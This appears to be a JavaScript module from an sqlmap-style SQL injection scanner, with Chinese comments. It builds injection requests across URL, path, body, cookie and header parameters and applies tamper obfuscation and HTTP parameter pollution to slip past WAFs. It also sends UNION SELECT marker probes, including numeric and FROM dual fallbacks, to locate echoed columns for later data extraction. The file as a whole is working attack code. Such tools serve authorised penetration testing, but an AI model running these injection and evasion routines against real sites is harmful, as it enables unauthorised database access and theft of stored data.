import { URL } from 'url';
import { fillPayload } from './payloads.js';
import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
import { resolveDbms, resolveFromClause } from './DialectSqlBuilder.js';

// 读取 target.config 的 prefix/suffix（对标 sqlmap --prefix / --suffix），
// 包裹「被注入的参数值」：最终注入值 = prefix + 原值 + payload + suffix。
// 仅影响注入请求——value 恰为原始值（基线请求）或直连模式时原样返回，不污染基线请求。
export function applyPrefixSuffix(target, point, value) {
  const cfg = (target && target.config) || {};
  const prefix = typeof cfg.prefix === 'string' ? cfg.prefix : '';
  const suffix = typeof cfg.suffix === 'string' ? cfg.suffix : '';
  if ((!prefix && !suffix) || (target && target.mode === 'direct')) return value;
  // 基线请求：value 恰为原始值（无 payload 拼接）时不包裹，保持基线请求原样
  const orig = (point && point.originalValue) || '1';
  if (value === orig) return value;
  return `${prefix}${value}${suffix}`;
}

// 统一的注入请求构造（url/body/cookie/header 四种注入点）
// 与 Detector.buildRequest / Extractor._build / DBFingerprinter._build 行为一致，集中维护避免三处漂移。
export function buildInjectionRequest(target, point, value) {
  // 先包裹 prefix/suffix（对标 sqlmap --prefix/--suffix），再按注入点位置拼入请求
  const injected = applyPrefixSuffix(target, point, value);
  // 直连模式：把 value（注入 payload）拼进 SQL 模板的 {INJECT} 标记处，产出 req.sql（由 DirectConnector 执行）。
  if (target && target.mode === 'direct') {
    const tpl = (point && point.sqlTemplate) || (target && target.sqlTemplate);
    const sql = String(tpl).replace(/\{INJECT\}/g, injected);
    return { method: '', url: '', params: {}, data: {}, headers: {}, sql };
  }
  // 表单点回退：优先用表单自身的提交方法与 action 地址；否则回退到 target 默认。
  const req = {
    method: point.formMethod || target.method,
    url: point.actionUrl || target.baseUrl,
    params: {},
    data: {},
    headers: { ...(target.headerParams || {}) },
  };
  const cookies = { ...(target.cookieParams || {}) };
  if (point.location === 'url') {
    const u = new URL(req.url);
    u.searchParams.set(point.param, injected);
    req.url = u.toString();
  } else if (point.location === 'path') {
    // P3 路径注入点：按 pathSegment 下标替换 URL 路径中的标记段（URL 构造器自动做路径编码）
    const u = new URL(req.url);
    const segments = u.pathname.split('/');
    // 优先用 pathSegment 下标；无下标时回退按 param 匹配段值（剥离尾部 * 后比较，兼容路径标记仍在 URL 中的场景）
    const idx =
      point.pathSegment != null
        ? point.pathSegment
        : segments.findIndex((s) => s.replace(/\*+$/g, '') === point.param);
    if (idx >= 0 && idx < segments.length) {
      segments[idx] = injected;
      u.pathname = segments.join('/');
    }
    req.url = u.toString();
  } else if (point.location === 'body') {
    // 表单点：将表单全部字段并入 data（含 CSRF token），再把当前注入参数覆盖为注入值
    const formValues = point.formValues || {};
    req.data = { ...formValues };
    req.data[point.param] = injected;
  } else if (point.location === 'cookie') {
    cookies[point.param] = injected;
    req.headers['Cookie'] = Object.entries(cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join('; ');
  } else if (point.location === 'header') {
    req.headers[point.param] = injected;
  }
  // [P2-5] --hpp：HTTP 参数污染（对标 sqlmap --hpp）。仅对 GET query 注入点生效：
  // 注入请求（值 ≠ 原始值）时把注入值额外写入 body 同名参数（query+body 双份），利用
  // WAF（常只查 query 单侧/首份）与后端解析（ASP.NET/IIS 读首份、PHP/Node qs 读末份、
  // 部分网关拼接两侧）的差异绕过检测。基线请求不双份，保持基线原样零污染。
  const _cfg = (target && target.config) || {};
  const _orig = (point && point.originalValue) || '1';
  if (point.location === 'url' && _cfg.hpp === true && injected !== _orig) {
    req.data[point.param] = injected;
  }
  return req;
}

// 经统一 HttpClient 发送（失败返回 null，不让单请求错误中断提取/指纹）
export async function sendInjection(httpClient, ctx, req, opts = {}) {
  const config = (ctx && ctx.config) || {};
  try {
    return await httpClient.request({
      method: req.method,
      url: req.url,
      params: req.params,
      data: req.data,
      headers: req.headers,
      sql: req.sql,
      timeoutMs: opts.timeoutMs ?? config.timeoutMs,
      retry: opts.retry ?? config.retry,
      proxy: config.proxy ?? false,
      auth: config.auth ?? null,
      wafEvasion: config.wafEvasion ?? null,
    });
  } catch {
    return null;
  }
}

// 按 WAF 规避配置包裹混淆（tamper 链式优先，否则 legacy obfuscate，否则原样）
export function obfuscateIfNeeded(ctx, value) {
  return obfuscateWithConfig(value, ctx);
}

const MARKER = 'SQLISCANNER';

// —— 数值型回显列兜底（修复对标 sqlmap 差距 D3：严格类型库 UNION 漏检）——
// 文本标记 'SQLISCANNER<i>' 落在 INT 回显列上时：MSSQL/Oracle/PG 等严格类型库因
// varchar→int 转换失败使整条 UNION 报错 → 完全漏检；MySQL 虽静默转 0 不报错，
// 标记同样变形无法命中。数字字面量在 int 列直接兼容、varchar 列被隐式转文本回显，
// 故文本探测落空后追加「两族不同基值的数字标记交叉确认」（双族交集，防页面固有
// 数字串——如时间戳子串——造成的假命中）。
const NUM_MARKER_BASE_A = 7331000;
const NUM_MARKER_BASE_B = 5182960;

// 构造一次标记 UNION 探测请求（boundary 由调用方传入：检测器带闭合前缀，提取/指纹不带）
function _markerProbe(ctx, columns, markerExprs, boundary, fromClause = '') {
  const { target, point } = ctx;
  const payload = fillPayload('{ORIG} UNION SELECT {MARKERS}', {
    orig: `${point.originalValue || '1'}${boundary}`,
  }).replace('{MARKERS}', markerExprs.join(',')) + fromClause;
  return { payload, req: buildInjectionRequest(target, point, obfuscateIfNeeded(ctx, payload)) };
}

function _textMarkers(columns) {
  return Array.from({ length: columns }, (_, i) => `'${MARKER}${i}'`);
}

function _numMarkers(base, columns) {
  return Array.from({ length: columns }, (_, i) => String(base + i));
}

async function _probeBody(httpClient, ctx, probe) {
  const res = await sendInjection(httpClient, ctx, probe.req);
  return String(res?.data ?? '');
}

// 用给定的 fromClause 做一轮完整回显列探测（text → numeric A → B 交叉确认）。
// 提取为独立函数以支持「DBMS 已知时用对应 FROM 子句、未知时先空再 FROM dual 兜底」两轮复用。
async function _probeWithFromClause(httpClient, ctx, columns, boundary, fromClause) {
  const textProbe = _markerProbe(ctx, columns, _textMarkers(columns), boundary, fromClause);
  const body = await _probeBody(httpClient, ctx, textProbe);
  const lower = body.toLowerCase();
  const cols = [];
  for (let i = 0; i < columns; i++) {
    // 大小写不敏感匹配：randomcase 等 tamper 会打乱回显标记的大小写
    if (lower.includes(`${MARKER}${i}`.toLowerCase())) cols.push(i);
  }
  if (cols.length > 0) {
    return { cols, numericCols: [], style: 'text', evidencePayload: textProbe.payload };
  }

  // 数字兜底 A 族
  const probeA = _markerProbe(ctx, columns, _numMarkers(NUM_MARKER_BASE_A, columns), boundary, fromClause);
  const bodyA = await _probeBody(httpClient, ctx, probeA);
  const hitsA = [];
  for (let i = 0; i < columns; i++) {
    if (bodyA.includes(String(NUM_MARKER_BASE_A + i))) hitsA.push(i);
  }
  if (hitsA.length === 0) {
    return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
  }

  // B 族交叉确认（仅保留双族同时命中的列，剔除页面固有数字串假命中）
  const probeB = _markerProbe(ctx, columns, _numMarkers(NUM_MARKER_BASE_B, columns), boundary, fromClause);
  const bodyB = await _probeBody(httpClient, ctx, probeB);
  const numericCols = hitsA.filter((i) => bodyB.includes(String(NUM_MARKER_BASE_B + i)));
  if (numericCols.length === 0) {
    return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
  }
  return { cols: [], numericCols, style: 'numeric', evidencePayload: probeA.payload };
}

// 定位可回显列（详细版）：
//   ① 文本标记探测（MySQL/SQLite 等宽松类型库一次请求即命中）
//   ② 落空时数字标记 A 族探测 → 命中后 B 族交叉确认（严格类型库 / INT 回显列兜底）
//   ③ ★FIX [P0]：DBMS 未知时补一轮 FROM dual 兜底
//      Oracle/DM8/DB2 等方言 SELECT 必须带 FROM 伪表，否则直接报错 → 第一轮全失败。
//      FROM dual 对 MySQL/Oracle 安全（合法），PG/SQLite/MSSQL 不支持 dual → 报错 → 不误报。
// 返回 { cols: 文本回显列, numericCols: 数值回显列(已交叉确认), style, evidencePayload }
//   - cols 语义与旧版 discoverEchoColumns 一致：仅文本可回显列（拖库/版本提取只能走文本列）
//   - evidencePayload：命中的那次请求 payload（供检测器记录证据）
export async function discoverEchoColumnsDetailed(httpClient, ctx, columns, boundary = '') {
  if (!(columns > 0)) return { cols: [], numericCols: [], style: 'none', evidencePayload: '' };

  // 根据 DBMS 决定 UNION SELECT 的伪表 FROM 子句
  // 已知 Oracle/DM8/DB2 等 → 第一轮直接带正确 FROM 子句，一次命中
  // 未知 DBMS → 第一轮不带 FROM（MySQL/MSSQL/SQLite/PG 等不需 FROM），失败后兜底 FROM dual
  const dbms = resolveDbms(ctx.dbms);
  const fromClause = resolveFromClause(dbms, ctx?.config?.unionFrom);

  // 第一轮：用 DBMS 对应的 fromClause 探测
  const result = await _probeWithFromClause(httpClient, ctx, columns, boundary, fromClause);
  if (result.style !== 'none') return result;

  // 第二轮：DBMS 未知且第一轮全失败 → FROM dual 兜底（覆盖 Oracle/DM8/DB2 等）
  if (!dbms) {
    const dualResult = await _probeWithFromClause(httpClient, ctx, columns, boundary, ' FROM dual');
    if (dualResult.style !== 'none') return dualResult;
  }

  // 两轮都失败
  return result;
}

// 在已知列数下用标记 UNION 定位可回显列（返回 0-based 索引数组）
// 提取器/指纹器复用本函数，避免各自硬编第 2 列。语义保持向后兼容：仅返回文本可回显列。
export async function discoverEchoColumns(httpClient, ctx, columns) {
  const { cols } = await discoverEchoColumnsDetailed(httpClient, ctx, columns);
  return cols;
}
